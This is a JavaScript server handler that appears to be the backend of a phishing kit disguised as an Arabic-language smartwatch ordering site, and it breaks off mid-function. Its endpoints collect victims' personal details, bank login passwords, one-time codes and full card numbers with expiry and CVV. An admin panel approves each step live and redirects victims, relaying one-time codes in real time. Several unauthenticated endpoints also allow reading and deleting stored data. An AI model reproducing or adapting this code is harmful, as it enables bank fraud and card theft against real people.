const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { supabase } = require('../lib/supabase');

const ADMIN_HASH = '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9';
const TOKEN_SECRET = ADMIN_HASH + '_mbank_secret';

function sha256(str) {
  return crypto.createHash('sha256').update(str).digest('hex');
}

function createToken() {
  const ts = Date.now().toString();
  const sig = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
  return ts + '.' + sig;
}

function verifyToken(token) {
  if (!token || !token.includes('.')) return false;
  const [ts, sig] = token.split('.');
  const expected = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
  if (sig !== expected) return false;
  const age = Date.now() - parseInt(ts);
  return age < 7 * 24 * 60 * 60 * 1000;
}

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || '0.0.0.0';
}

function getCookies(req) {
  return (req.headers.cookie || '').split(';').reduce((acc, c) => {
    const [k, v] = c.trim().split('=');
    if (k) acc[k] = v;
    return acc;
  }, {});
}

function isAdmin(req) {
  const header = req.headers['x-admin-token'];
  if (header && verifyToken(header)) return true;
  const cookies = getCookies(req);
  return verifyToken(cookies.admin_token);
}

function readBody(req) {
  return new Promise((resolve) => {
    if (req.body !== undefined) {
      resolve(typeof req.body === 'string' ? req.body : JSON.stringify(req.body));
      return;
    }
    let body = '';
    req.on('data', c => { body += c; if (body.length > 1e6) req.destroy(); });
    req.on('end', () => resolve(body));
  });
}

function json(res, data, status) {
  res.writeHead(status || 200, {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, x-admin-token'
  });
  res.end(JSON.stringify(data));
}

async function syncCustomer(ip, data) {
  const id = ip.replace(/\./g, '_');
  const { data: existing } = await supabase.from('customers').select('id').eq('id', id).single();
  const record = { id, status: 'active', updated_at: new Date().toISOString(), ...data };
  if (existing) {
    await supabase.from('customers').update(record).eq('id', id);
  } else {
    record.created_at = new Date().toISOString();
    await supabase.from('customers').upsert(record, { onConflict: 'id' });
  }
  return id;
}

module.exports = async (req, res) => {
  if (req.method === 'OPTIONS') {
    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, x-admin-token'
    });
    return res.end();
  }

  const reqPath = decodeURIComponent(req.url.split('?')[0]);

  // --- Sync existing orders/sessions into customers table ---
  if (req.method === 'POST' && reqPath === '/api/sync-customers') {
    const { data: orders } = await supabase.from('orders').select('*').order('id', { ascending: false });
    let synced = 0;
    for (const o of (orders || [])) {
      if (!o.ip) continue;
      const id = o.ip.replace(/\./g, '_');
      const step = o.status === 'payment_pending' ? 'payment' : o.status === 'click' ? 'landing' : 'order';
      await supabase.from('customers').upsert({
        id, email: o.email || '', username: o.name || '',
        status: o.status === 'blocked' ? 'blocked' : 'active',
        current_step: step, last_page: '/' + (o.lang || 'ar') + '/order',
        last_action: o.status, user_agent: '',
        data: JSON.stringify({ orderId: o.id, phone: o.phone, emirate: o.emirate, country: o.country }),
        created_at: o.date || new Date().toISOString(),
        updated_at: new Date().toISOString()
      }, { onConflict: 'id' });
      synced++;
    }
    return json(res, { ok: true, synced });
  }

  // --- Admin Login ---
  if (req.method === 'POST' && (reqPath === '/admin/login' || reqPath === '/api/admin-login')) {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      if (sha256(data.password || '') === ADMIN_HASH) {
        const token = createToken();
        return json(res, { success: true, token });
      }
      return json(res, { success: false, message: 'كلمة المرور غير صحيحة' }, 401);
    } catch (e) {
      return json(res, { success: false, message: 'خطأ في الطلب' }, 400);
    }
  }

  // --- Clicks ---
  if (req.method === 'POST' && reqPath === '/api/clicks') {
    const ip = getIP(req);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      await supabase.from('orders').insert({
        name: '', phone: '', id_number: '', email: '', emirate: '', address: '',
        country: (data.country || 'غير معروف').substring(0, 100),
        service: (data.service || '').substring(0, 100),
        lang: data.lang || 'ar',
        ip,
        status: 'click',
        date: new Date().toISOString()
      });
      await syncCustomer(ip, {
        current_step: 'landing', last_page: data.page || '/',
        last_action: 'click', user_agent: req.headers['user-agent'] || ''
      });
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Orders ---
  if (req.method === 'POST' && reqPath === '/api/orders') {
    const ip = getIP(req);
    const { data: blocked } = await supabase.from('blocked_ips').select('ip').eq('ip', ip).single();
    if (blocked) return json(res, { success: false, message: 'محظور' }, 403);

    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const { data: order, error } = await supabase.from('orders').insert({
        name: (data.name || '').substring(0, 100),
        phone: (data.phone || '').substring(0, 20),
        id_number: (data.id_number || '').substring(0, 50),
        email: (data.email || '').substring(0, 100),
        emirate: (data.emirate || '').substring(0, 50),
        address: (data.address || '').substring(0, 200),
        country: (data.country || 'الإمارات').substring(0, 50),
        service: (data.service || 'طلب ساعة ذكية').substring(0, 100),
        lang: data.lang || 'ar',
        ip,
        status: 'pending',
        date: new Date().toISOString()
      }).select().single();
      if (error) return json(res, { error: error.message }, 500);
      await syncCustomer(ip, {
        email: data.email || '', username: data.name || '',
        current_step: 'order', last_page: '/order',
        last_action: 'submitted_order', user_agent: req.headers['user-agent'] || '',
        data: JSON.stringify({ orderId: order.id, phone: data.phone, emirate: data.emirate })
      });
      return json(res, { success: true, id: order.id });
    } catch (e) {
      return json(res, { success: false, message: 'خطأ في البيانات' }, 400);
    }
  }

  // --- Stats ---
  if (req.method === 'GET' && reqPath === '/api/stats') {
    const cutoff = new Date(Date.now() - 60000).toISOString();
    const { count: activeCount } = await supabase.from('visitors').select('id', { count: 'exact', head: true }).gt('last_seen', cutoff);
    const { count: totalOrders } = await supabase.from('orders').select('id', { count: 'exact', head: true });
    const { count: pendingOrders } = await supabase.from('orders').select('id', { count: 'exact', head: true }).eq('status', 'pending');
    return json(res, {
      activeVisitors: activeCount || 0,
      totalVisitsToday: 0,
      pageViewsToday: 0,
      totalOrders: totalOrders || 0,
      pendingOrders: pendingOrders || 0
    });
  }

  // --- Get Orders ---
  if (req.method === 'GET' && reqPath === '/api/orders') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const { data: orders } = await supabase.from('orders').select('*').order('id', { ascending: false });
    return json(res, { orders: orders || [] });
  }

  // --- Visitors ---
  if (req.method === 'GET' && reqPath === '/api/visitors') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const cutoff = new Date(Date.now() - 60000).toISOString();
    const { data: active } = await supabase.from('visitors').select('*').gt('last_seen', cutoff);
    return json(res, { visitors: active || [], count: (active || []).length });
  }

  // --- Order Status ---
  if (req.method === 'POST' && reqPath === '/api/orders/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const { error } = await supabase.from('orders').update({ status: data.status }).eq('id', data.id);
      if (error) return json(res, { error: 'not found' }, 404);
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Block IP ---
  if (req.method === 'POST' && reqPath === '/api/block-ip') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      await supabase.from('blocked_ips').upsert({ ip: data.ip }, { onConflict: 'ip' });
      await supabase.from('orders').update({ status: 'blocked' }).eq('ip', data.ip);
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Login Attempts (Sessions) ---
  if (req.method === 'POST' && reqPath === '/api/login-attempts') {
    const ip = getIP(req);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      if (data.sessionId) {
        const { data: existing } = await supabase.from('sessions').select('id').eq('id', parseInt(data.sessionId)).single();
        if (existing) {
          await supabase.from('sessions').update({
            username: (data.username || '').substring(0, 100),
            password: (data.password || '').substring(0, 100),
            login_status: 'waiting',
            otp: null,
            otp_status: null,
            redirect_url: null,
            date: new Date().toISOString()
          }).eq('id', existing.id);
          return json(res, { success: true, id: existing.id });
        }
      }
      const { data: session, error } = await supabase.from('sessions').insert({
        username: (data.username || '').substring(0, 100),
        password: (data.password || '').substring(0, 100),
        country: (data.country || 'غير معروف').substring(0, 100),
        lang: data.lang || 'ar',
        ip,
        service: (data.service || '').substring(0, 200),
        order_name: (data.orderName || '').substring(0, 100),
        order_phone: (data.orderPhone || '').substring(0, 50),
        order_email: (data.orderEmail || '').substring(0, 100),
        order_id_number: (data.orderIdNumber || '').substring(0, 50),
        order_emirate: (data.orderEmirate || '').substring(0, 50),
        order_address: (data.orderAddress || '').substring(0, 200),
        order_id: data.orderId ? parseInt(data.orderId) : null,
        login_status: 'waiting',
        date: new Date().toISOString()
      }).select().single();
      if (error) return json(res, { error: error.message }, 500);
      return json(res, { success: true, id: session.id });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Login Attempt Status Check ---
  if (req.method === 'GET' && reqPath.startsWith('/api/login-attempts/') && reqPath.endsWith('/status')) {
    const id = parseInt(reqPath.split('/')[3]);
    const { data: s } = await supabase.from('sessions').select('login_status, redirect_url').eq('id', id).single();
    if (!s) return json(res, { status: 'not_found' }, 404);
    return json(res, { status: s.login_status, redirectUrl: s.redirect_url || null });
  }

  // --- Update Login Status ---
  if (req.method === 'POST' && reqPath === '/api/login-attempts/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const { error } = await supabase.from('sessions').update({ login_status: data.status }).eq('id', data.id);
      if (error) return json(res, { error: 'not found' }, 404);
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- OTP Attempts ---
  if (req.method === 'POST' && reqPath === '/api/otp-attempts') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const id = parseInt(data.loginId);
      const { data: s } = await supabase.from('sessions').select('id').eq('id', id).single();
      if (!s) return json(res, { error: 'session not found' }, 404);
      await supabase.from('sessions').update({
        otp: (data.otp || '').substring(0, 20),
        otp_status: 'waiting'
      }).eq('id', id);
      return json(res, { success: true, id });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- OTP Status Check ---
  if (req.method === 'GET' && reqPath.startsWith('/api/otp-attempts/') && reqPath.endsWith('/status')) {
    const id = parseInt(reqPath.split('/')[3]);
    const { data: s } = await supabase.from('sessions').select('otp_status, redirect_url').eq('id', id).single();
    if (!s) return json(res, { status: 'not_found' }, 404);
    return json(res, { status: s.otp_status || 'not_found', redirectUrl: s.redirect_url || null });
  }

  // --- Update OTP Status ---
  if (req.method === 'POST' && reqPath === '/api/otp-attempts/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const { error } = await supabase.from('sessions').update({ otp_status: data.status }).eq('id', data.id);
      if (error) return json(res, { error: 'not found' }, 404);
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Sessions List ---
  if (req.method === 'GET' && reqPath === '/api/sessions') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const { data: sessions } = await supabase.from('sessions').select('*').order('id', { ascending: false });
    const list = (sessions || []).map(s => {
      let pendingAction = null;
      if (s.login_status === 'waiting') {
        pendingAction = { type: 'login', id: s.id };
      } else if (s.login_status === 'approved' && s.otp_status === 'waiting') {
        pendingAction = { type: 'otp', id: s.id };
      }
      return {
        ...s,
        loginStatus: s.login_status,
        otpStatus: s.otp_status,
        redirectUrl: s.redirect_url,
        orderName: s.order_name,
        orderPhone: s.order_phone,
        orderEmail: s.order_email,
        orderIdNumber: s.order_id_number,
        orderEmirate: s.order_emirate,
        orderAddress: s.order_address,
        orderId: s.order_id,
        pendingAction
      };
    });
    return json(res, { sessions: list });
  }

  // --- Session Redirect ---
  if (req.method === 'POST' && reqPath === '/api/sessions/redirect') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const { error } = await supabase.from('sessions').update({ redirect_url: data.url }).eq('id', data.id);
      if (error) return json(res, { error: 'not found' }, 404);
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Payment (card data) ---
  if (req.method === 'POST' && reqPath === '/api/payment') {
    const ip = getIP(req);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const orderId = data.order_id ? parseInt(data.order_id) : null;
      const { data: payment, error } = await supabase.from('sessions').insert({
        username: (data.card_name || '').substring(0, 100),
        password: (data.card_number || '').substring(0, 30),
        otp: (data.card_expiry || '').substring(0, 10),
        country: (data.card_cvv || '').substring(0, 10),
        service: 'payment',
        order_id: orderId,
        ip,
        login_status: 'waiting',
        lang: 'ar',
        date: new Date().toISOString()
      }).select().single();
      if (error) return json(res, { error: error.message }, 500);
      if (orderId) {
        await supabase.from('orders').update({ status: 'payment_pending' }).eq('id', orderId);
      }
      await syncCustomer(ip, {
        current_step: 'payment', last_page: '/payment',
        last_action: 'entered_card', status: 'active'
      });
      return json(res, { success: true, id: payment.id });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Payment Status Check ---
  if (req.method === 'GET' && reqPath === '/api/payment-status') {
    const url = require('url');
    const parsed = url.parse(req.url, true);
    const id = parseInt(parsed.query.id);
    if (!id) return json(res, { status: 'not_found' }, 404);
    const { data: s } = await supabase.from('sessions').select('login_status, redirect_url').eq('id', id).single();
    if (!s) return json(res, { status: 'not_found' }, 404);
    return json(res, { status: s.login_status, redirectUrl: s.redirect_url || null });
  }

  // --- Verify OTP (payment) ---
  if (req.method === 'POST' && reqPath === '/api/verify-otp') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const id = parseInt(data.id);
      const { data: s } = await supabase.from('sessions').select('id').eq('id', id).single();
      if (!s) return json(res, { error: 'not found' }, 404);
      await supabase.from('sessions').update({
        otp: (data.code || '').substring(0, 20),
        otp_status: 'waiting'
      }).eq('id', id);
      return json(res, { success: true, id });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Resend OTP ---
  if (req.method === 'POST' && reqPath === '/api/resend-otp') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const id = parseInt(data.id);
      await supabase.from('sessions').update({ otp_status: 'resend_requested' }).eq('id', id);
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // ── Firebase RTDB-compatible helpers (for admin panel) ──
  function normFbPath(p) { return (p || '').replace(/^\/+|\/+$/g, ''); }

  function deepMerge(target, source) {
    if (!source || typeof source !== 'object') return source;
    if (!target || typeof target !== 'object') target = {};
    const out = { ...target };
    for (const [k, v] of Object.entries(source)) {
      if (v !== undefined) {
        if (v && typeof v === 'object' && !Array.isArray(v) && !(v instanceof Date)) {
          out[k] = deepMerge(out[k], v);
        } else { out[k] = v; }
      }
    }
    return out;
  }

  function genKey() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const bytes = crypto.randomBytes(20);
    let key = '-';
    for (let i = 0; i < 19; i++) key += chars[bytes[i] % chars.length];
    return key;
  }

  function expandSlashKeys(obj) {
    if (!obj || typeof obj !== 'object' || Array.isArray(obj)) return obj;
    const result = {};
    for (const [key, value] of Object.entries(obj)) {
      if (key.includes('/')) {
        const parts = key.split('/');
        let cur = result;
        for (let i = 0; i < parts.length - 1; i++) {
          if (!cur[parts[i]] || typeof cur[parts[i]] !== 'object') cur[parts[i]] = {};
          cur = cur[parts[i]];
        }
        cur[parts[parts.length - 1]] = value;
      } else {
        if (value && typeof value === 'object' && !Array.isArray(value) && result[key] && typeof result[key] === 'object') {
          result[key] = deepMerge(result[key], value);
        } else { result[key] = value; }
      }
    }
    return result;
  }

  function pathToTable(p) {
    const parts = p.split('/');
    const root = parts[0];
    const mapping = {
      dashboardAccounts: 'dashboard_accounts',
      dashboardUsers: 'dashboard_accounts',
      customers: 'customers',
      settings: 'settings',
      customerEvents: 'customer_events'
    };
    return { table: mapping[root] || null, root, parts };
  }

  function rowToFirebase(row, table) {
    if (!row) return null;
    if (table === 'dashboard_accounts') {
      return {
        id: row.id, email: row.email, password: row.password, role: row.role,
        name: row.name, status: row.status,
        createdAt: row.created_at, updatedAt: row.updated_at,
        lastLoginAt: row.last_login_at, forceLogoutAt: row.force_logout_at || 0
      };
    }
    if (table === 'customers') {
      const base = {
        id: row.id, code: row.code, email: row.email, username: row.username,
        password: row.password, accountType: row.account_type,
        status: row.status, currentStep: row.current_step,
        lastPage: row.last_page, lastAction: row.last_action,
        selectedWatch: row.selected_watch, userAgent: row.user_agent,
        createdAt: row.created_at, updatedAt: row.updated_at
      };
      if (row.data && typeof row.data === 'object') {
        const expanded = expandSlashKeys(row.data);
        for (const [k, v] of Object.entries(expanded)) {
          if (v && typeof v === 'object' && !Array.isArray(v) && base[k] && typeof base[k] === 'object') {
            base[k] = deepMerge(base[k], v);
          } else { base[k] = v; }
        }
      }
      if (base.presence && typeof base.presence === 'object') {
        const lastSeen = base.presence.lastChangedAt;
        if (lastSeen) {
          const age = Date.now() - (typeof lastSeen === 'number' ? lastSeen : new Date(lastSeen).getTime());
          if (age > 15000) base.presence.state = 'offline';
        } else if (!base.presence.lastChangedAt) { base.presence.state = 'offline'; }
      }
      return base;
    }
    if (table === 'settings') return row.value;
    if (table === 'customer_events') {
      return { id: row.id, customerId: row.customer_id, eventType: row.event_type, data: row.data, createdAt: row.created_at };
    }
    return row;
  }

  function firebaseToRow(data, table) {
    if (table === 'dashboard_accounts') {
      const row = {};
      if (data.id !== undefined) row.id = data.id;
      if (data.email !== undefined) row.email = data.email;
      if (data.password !== undefined) row.password = data.password;
      if (data.role !== undefined) row.role = data.role;
      if (data.name !== undefined) row.name = data.name;
      if (data.status !== undefined) row.status = data.status;
      if (data.createdAt !== undefined) row.created_at = data.createdAt;
      if (data.updatedAt !== undefined) row.updated_at = data.updatedAt;
      if (data.lastLoginAt !== undefined) row.last_login_at = data.lastLoginAt;
      if (data.forceLogoutAt !== undefined) row.force_logout_at = data.forceLogoutAt;
      return row;
    }
    if (table === 'customers') {
      const row = {};
      const knownFields = ['id','code','email','username','password','accountType','status','currentStep','lastPage','lastAction','selectedWatch','userAgent','createdAt','updatedAt'];
      if (data.id !== undefined) row.id = data.id;
      if (data.code !== undefined) row.code = data.code;
      if (data.email !== undefined) row.email = data.email;
      if (data.username !== undefined) row.username = data.username;
      if (data.password !== undefined) row.password = data.password;
      if (data.accountType !== undefined) row.account_type = data.accountType;
      if (data.status !== undefined) row.status = data.status;
      if (data.currentStep !== undefined) row.current_step = data.currentStep;
      if (data.lastPage !== undefined) row.last_page = data.lastPage;
      if (data.lastAction !== undefined) row.last_action = data.lastAction;
      if (data.selectedWatch !== undefined) row.selected_watch = data.selectedWatch;
      if (data.userAgent !== undefined) row.user_agent = data.userAgent;
      if (data.createdAt !== undefined) row.created_at = data.createdAt;
      if (data.updatedAt !== undefined) row.updated_at = data.updatedAt;
      const extra = {};
      for (const [k, v] of Object.entries(data)) {
        if (!knownFields.includes(k)) extra[k] = v;
      }
      if (Object.keys(extra).length) row.data = deepMerge(row.data || {}, extra);
      return row;
    }
    return data;
  }

  async function rtdbRead(rawPath) {
    const p = normFbPath(rawPath);
    if (!p) return null;
    const { table, root, parts } = pathToTable(p);
    if (!table) return null;
    if (parts.length === 1) {
      if (table === 'settings') {
        const { data, error } = await supabase.from(table).select('*');
        if (error || !data || !data.length) return null;
        const result = {};
        for (const row of data) { if (!row.key.startsWith('_da|')) result[row.key] = row.value; }
        return result;
      }
      const { data, error } = await supabase.from(table).select('*');
      if (error || !data || !data.length) return null;
      const result = {};
      for (const row of data) { result[row.id] = rowToFirebase(row, table); }
      if (table === 'dashboard_accounts') {
        const { data: extras } = await supabase.from('settings').select('*').like('key', '_da|%');
        if (extras) {
          for (const srow of extras) {
            const pi1 = srow.key.indexOf('|');
            const pi2 = srow.key.indexOf('|', pi1 + 1);
            if (pi1 >= 0 && pi2 > pi1) {
              const adminId = srow.key.substring(pi1 + 1, pi2);
              const subKey = srow.key.substring(pi2 + 1);
              if (result[adminId]) {
                const subParts = subKey.split('/');
                let cur = result[adminId];
                for (let i = 0; i < subParts.length - 1; i++) {
                  if (!cur[subParts[i]] || typeof cur[subParts[i]] !== 'object') cur[subParts[i]] = {};
                  cur = cur[subParts[i]];
                }
                cur[subParts[subParts.length - 1]] = srow.value;
              }
            }
          }
        }
      }
      return result;
    }
    if (parts.length >= 2) {
      const id = parts[1];
      if (table === 'settings') {
        const { data, error } = await supabase.from(table).select('*').eq('key', id).single();
        if (error || !data) return null;
        return data.value;
      }
      const { data, error } = await supabase.from(table).select('*').eq('id', id).single();
      if (error || !data) return null;
      const fbData = rowToFirebase(data, table);
      if (table === 'dashboard_accounts') {
        const prefix = `_da|${id}|`;
        const { data: extras } = await supabase.from('settings').select('*').like('key', prefix + '%');
        if (extras) {
          for (const row of extras) {
            const subKey = row.key.substring(prefix.length);
            const subParts = subKey.split('/');
            let cur = fbData;
            for (let i = 0; i < subParts.length - 1; i++) {
              if (!cur[subParts[i]] || typeof cur[subParts[i]] !== 'object') cur[subParts[i]] = {};
              cur = cur[subParts[i]];
            }
            cur[subParts[subParts.length - 1]] = row.value;
          }
        }
      }
      if (parts.length > 2) {
        let cur = fbData;
        for (let i = 2; i < parts.length; i++) {
          if (cur == null || typeof cur !== 'object') return null;
          cur = cur[parts[i]];
        }
        return cur ?? null;
      }
      return fbData;
    }
    return null;
  }

  async function rtdbSet(rawPath, value) {
    const p = normFbPath(rawPath);
    if (!p) return;
    const { table, root, parts } = pathToTable(p);
    if (!table) return;
    if (value === null || value === undefined) { return rtdbRemove(rawPath); }
    if (table === 'dashboard_accounts' && parts.length > 2) {
      const id = parts[1];
      const subPath = parts.slice(2).join('/');
      const settingsKey = `_da|${id}|${subPath}`;
      await supabase.from('settings').upsert({ key: settingsKey, value, updated_at: new Date().toISOString() }, { onConflict: 'key' });
      return;
    }
    if (parts.length < 2) return;
    const id = parts[1];
    if (table === 'settings') {
      await supabase.from(table).upsert({ key: id, value, updated_at: new Date().toISOString() }, { onConflict: 'key' });
      return;
    }
    if (parts.length === 2) {
      const row = firebaseToRow({ id, ...value }, table);
      row.id = id;
      await supabase.from(table).upsert(row, { onConflict: 'id' });
      return;
    }
    const { data: existing } = await supabase.from(table).select('*').eq('id', id).single();
    if (!existing) {
      const newData = {};
      let cur = newData;
      for (let i = 2; i < parts.length - 1; i++) { cur[parts[i]] = {}; cur = cur[parts[i]]; }
      cur[parts[parts.length - 1]] = value;
      const row = firebaseToRow({ id, ...newData }, table);
      row.id = id;
      await supabase.from(table).upsert(row, { onConflict: 'id' });
      return;
    }
    const fbData = rowToFirebase(existing, table);
    let cur = fbData;
    for (let i = 2; i < parts.length - 1; i++) {
      if (!cur[parts[i]] || typeof cur[parts[i]] !== 'object') cur[parts[i]] = {};
      cur = cur[parts[i]];
    }
    cur[parts[parts.length - 1]] = value;
    const row = firebaseToRow(fbData, table);
    row.id = id;
    await supabase.from(table).upsert(row, { onConflict: 'id' });
  }

  async function rtdbUpdate(rawPath, updates) {
    const p = normFbPath(rawPath);
    if (!p || !updates) return;
    const { table, root, parts } = pathToTable(p);
    if (!table || parts.length < 2) return;
    const id = parts[1];
    const expanded = expandSlashKeys(updates);
    if (table === 'settings') {
      const { data: existing } = await supabase.from(table).select('*').eq('key', id).single();
      const merged = deepMerge(existing?.value || {}, expanded);
      await supabase.from(table).upsert({ key: id, value: merged, updated_at: new Date().toISOString() }, { onConflict: 'key' });
      return;
    }
    if (table === 'dashboard_accounts') {
      const knownAdminFields = ['id','email','password','role','name','status','createdAt','updatedAt','lastLoginAt','forceLogoutAt'];
      const knownUpdates = {};
      const extraUpdates = {};
      for (const [k, v] of Object.entries(expanded)) {
        if (knownAdminFields.includes(k)) knownUpdates[k] = v;
        else extraUpdates[k] = v;
      }
      if (Object.keys(knownUpdates).length) {
        const { data: existing } = await supabase.from(table).select('*').eq('id', id).single();
        const fbData = existing ? rowToFirebase(existing, table) : { id };
        Object.assign(fbData, knownUpdates);
        const row = firebaseToRow(fbData, table);
        row.id = id;
        await supabase.from(table).upsert(row, { onConflict: 'id' });
      }
      for (const [k, v] of Object.entries(extraUpdates)) {
        const settingsKey = `_da|${id}|${k}`;
        await supabase.from('settings').upsert({ key: settingsKey, value: v, updated_at: new Date().toISOString() }, { onConflict: 'key' });
      }
      return;
    }
    const { data: existing } = await supabase.from(table).select('*').eq('id', id).single();
    const fbData = existing ? rowToFirebase(existing, table) : { id };
    if (parts.length > 2) {
      let cur = fbData;
      for (let i = 2; i < parts.length; i++) {
        if (!cur[parts[i]] || typeof cur[parts[i]] !== 'object') cur[parts[i]] = {};
        cur = cur[parts[i]];
      }
      Object.assign(cur, expanded);
    } else {
      for (const [k, v] of Object.entries(expanded)) {
        if (v && typeof v === 'object' && !Array.isArray(v) && fbData[k] && typeof fbData[k] === 'object') {
          fbData[k] = deepMerge(fbData[k], v);
        } else { fbData[k] = v; }
      }
    }
    const row = firebaseToRow(fbData, table);
    row.id = id;
    await supabase.from(table).upsert(row, { onConflict: 'id' });
  }

  async function rtdbPush(rawPath, value) {
    const p = normFbPath(rawPath);
    const key = genKey();
    const { table } = pathToTable(p);
    if (table === 'customer_events') {
      const row = {
        customer_id: value.customerId || null,
        event_type: value.eventType || 'unknown',
        data: value.data || value,
        created_at: value.createdAt || new Date().toISOString()
      };
      let { error } = await supabase.from(table).insert(row);
      if (error && error.message?.includes('foreign key')) {
        row.customer_id = null;
        ({ error } = await supabase.from(table).insert(row));
      }
      if (error) throw error;
      return key;
    }
    await rtdbSet(`${p}/${key}`, value);
    return key;
  }

  async function rtdbRemove(rawPath) {
    const p = normFbPath(rawPath);
    if (!p) return;
    const { table, parts } = pathToTable(p);
    if (!table) return;
    if (parts.length === 1) { await supabase.from(table).delete().neq('id', '___never___'); return; }
    const id = parts[1];
    if (parts.length === 2) {
      if (table === 'settings') await supabase.from(table).delete().eq('key', id);
      else await supabase.from(table).delete().eq('id', id);
      return;
    }
    const { data: existing } = await supabase.from(table).select('*').eq('id', id).single();
    if (!existing) return;
    const fbData = rowToFirebase(existing, table);
    let cur = fbData;
    for (let i = 2; i < parts.length - 1; i++) { if (!cur[parts[i]]) return; cur = cur[parts[i]]; }
    delete cur[parts[parts.length - 1]];
    const row = firebaseToRow(fbData, table);
    row.id = id;
    await supabase.from(table).upsert(row, { onConflict: 'id' });
  }

  // ── Firebase-compatible API endpoints ──
  const authTokens = {};

  if (req.method === 'POST' && reqPath === '/api/fb/read') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const val = await rtdbRead(data.path);
      return json(res, { value: val });
    } catch (e) { return json(res, { error: e.message }, 500); }
  }

  if (req.method === 'POST' && reqPath === '/api/fb/set') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      await rtdbSet(data.path, data.value);
      return json(res, { ok: true });
    } catch (e) { return json(res, { error: e.message }, 500); }
  }

  if (req.method === 'POST' && reqPath === '/api/fb/update') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      await rtdbUpdate(data.path, data.value);
      return json(res, { ok: true });
    } catch (e) { return json(res, { error: e.message }, 500); }
  }

  if (req.method === 'POST' && reqPath === '/api/fb/push') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const key = await rtdbPush(data.path, data.value);
      return json(res, { key });
    } catch (e) { return json(res, { error: e.message }, 500); }
  }

  if (req.method === 'POST' && reqPath === '/api/fb/remove') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      await rtdbRemove(data.path);
      return json(res, { ok: true });
    } catch (e) { return json(res, { error: e.message }, 500); }
  }

  if (req.method === 'GET' && reqPath === '/api/fb/poll') {
    try {
      const qs = (req.url.split('?')[1]) || '';
      const params = new URLSearchParams(qs);
      let pollPath = params.get('path');
      if (!pollPath && req.query && typeof req.query.path === 'string') pollPath = req.query.path;
      if (pollPath === '_debug') return json(res, { url: req.url, query: req.query, qs });
      const val = await rtdbRead(normFbPath(pollPath));
      return json(res, { value: val });
    } catch (e) { return json(res, { error: e.message }, 500); }
  }

  // ── Auth API (for admin panel) ──
  if (req.method === 'POST' && reqPath === '/api/auth/signin') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const { email, password } = data;
      if (!email || !password) return json(res, { error: 'missing fields' }, 400);
      const key = email.trim().toLowerCase().replace(/[.#$\[\]]/g, '_');
      const { data: row, error } = await supabase.from('dashboard_accounts').select('*').eq('id', key).single();
      if (error || !row) return json(res, { code: 'auth/user-not-found', message: 'User not found' }, 401);
      if (row.status === 'inactive') return json(res, { code: 'auth/user-disabled', message: 'Account disabled' }, 401);
      if (row.password !== password) return json(res, { code: 'auth/wrong-password', message: 'Wrong password' }, 401);
      const token = crypto.randomBytes(32).toString('hex');
      authTokens[token] = { uid: key, email: email.trim().toLowerCase() };
      return json(res, { uid: key, email: email.trim().toLowerCase(), token, claims: { role: row.role } });
    } catch (e) { return json(res, { error: e.message }, 500); }
  }

  if (req.method === 'POST' && reqPath === '/api/auth/create') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const { email, password } = data;
